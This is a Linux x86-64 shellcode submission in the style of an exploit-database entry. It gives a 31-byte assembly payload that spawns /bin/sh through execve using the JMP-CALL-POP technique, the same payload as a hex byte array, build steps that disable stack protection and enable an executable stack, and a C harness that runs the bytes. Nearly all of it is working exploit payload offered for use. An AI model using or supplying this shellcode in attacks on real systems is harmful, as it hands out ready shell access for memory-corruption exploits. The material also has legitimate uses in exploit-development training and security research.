/*
;Title: Linux/x86-64 - /bin/sh Shellcode
;Author: Touhid M.Shaikh
;Contact: https://github.com/touhidshaikh
;Category: Shellcode
;Architecture: Linux x86_64
;Description: This shellcode baased on "JMP CALL POP" method to Execute "/bin//sh". Length of shellcode is 31 bytes.
;Tested on : #1 SMP PREEMPT RT Debian 4.9.25-1kali1 (2017-05-04)



===COMPILATION AND EXECUTION===
#nasm -f elf64 shell.asm -o shell.o

#ld shell.o -o shell <=== Making Binary File


#./bin2shell.sh shell <== xtract hex code from the binary(https://github.com/touhidshaikh/bin2shell)

=================SHELLCODE(INTEL FORMAT)=================

section .text
	global _start
_start:
	jmp shell
here:
	xor rax,rax
	pop rdi
	xor rsi,rsi
	xor rdx,rdx
	add rax,59
	syscall
shell:
	call here
bash db "/bin//sh"

===================END HERE============================

Compile with gcc with some options.

# gcc -fno-stack-protector -z execstack shell-testing.c -o shell-testing


*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x10\x48\x31\xc0\x5f\x48\x31\xf6\x48\x31\xd2\x48\x83\xc0\x3b\x0f\x05\xe8\xeb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68";

main()
{
	printf("Touhid Shaikh (http://www.touhidshaikh.com)\n");
	printf("Shellcode Length :  %d\n", (int)strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}